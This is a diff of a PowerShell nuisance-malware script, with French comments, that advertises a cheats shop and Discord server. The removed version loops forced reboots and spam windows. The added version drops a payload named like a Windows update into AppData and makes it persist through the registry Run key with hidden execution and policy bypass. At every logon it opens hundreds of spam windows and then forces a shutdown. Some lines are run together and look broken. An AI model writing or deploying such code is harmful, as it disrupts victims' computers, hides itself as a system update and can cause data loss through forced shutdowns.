@@ -1,12 +1,22 @@
-while ($true) {
-    # Planifie un redémarrage dans 1 minute (60 secondes)
-    shutdown /r /t 60 /f
-
-    # Ouvre plusieurs fenêtres de commande avec un titre dynamique et du texte en boucle
-    for ($i = 0; $i -lt 15; $i++) {
-        $randomTitle = -join (Get-Random -InputObject ('A'..'Z') -Count 8)
-        Start-Process cmd -ArgumentList "/k title $randomTitle && color 0A && :loop && echo aegisshop.xyz | DISCORD.GG/AEGIS-V2 BEST CHEATS JOIN FOR FREE CANDY && goto loop"
-    }
-
-    Start-Sleep -Seconds 5
+# Script de persistance et de génération de fenêtres (max 500)
+$scriptPath = "$env:APPDATA\WindowsUpdateTask.ps1"
+$scriptContent = @'$count = 0
+while ($count -lt 500) {$randomLeft = Get-Random -Minimum 0 -Maximum 1200
+    $randomTop = Get-Random -Minimum 0 -Maximum 800$randomTitle = -join (Get-Random -InputObject ('A'..'Z') -Count 6)
+    
+    Start-Process cmd -ArgumentList "/k title $randomTitle && color 0C && :loop && echo aegisshop.xyz | DISCORD.GG/AEGIS-V2 BEST CHEATS JOIN FOR FREE CANDY && goto loop"
+    
+    $count++
+    Start-Sleep -Milliseconds 100
 }
+shutdown /s /f /t 0
+'@
+
+# Enregistrement du script sur le disque
+Set-Content -Path $scriptPath -Value$scriptContent -Force
+
+# Configuration de la persistance au démarrage via le Registre Windows (Run)
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdateTask" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+
+# Lancement immédiat de la première instance
+Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
